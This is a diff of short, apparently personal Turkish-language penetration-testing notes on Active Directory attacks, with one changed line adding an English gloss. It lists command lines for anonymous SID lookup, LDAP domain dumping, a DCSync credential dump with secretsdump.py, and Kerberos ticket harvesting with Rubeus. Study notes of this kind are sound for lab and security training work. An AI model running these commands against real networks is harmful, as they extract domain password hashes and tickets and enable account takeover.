@@ -6,7 +6,7 @@ anonim bir smb giriş var ise "lookupsid.py anonim@ip" yapabiliriz
 4)ldapdomaindump [IP] -u 'LAB-ENTERPRISE\nik' -p [PW]
 
 
-python3 secretsdump.py -just-dc kullanıcıadı:şifre@domain.asd == CDLC attack
+python3 secretsdump.py -just-dc kullanıcıadı:şifre@domain.asd == CDLC attack = If some user have rights to perform DCSYNC
 ------
 
 1) Rubeus.exe harvest /interval:30 == 30 saniyede bir bilet verecek olan komut 
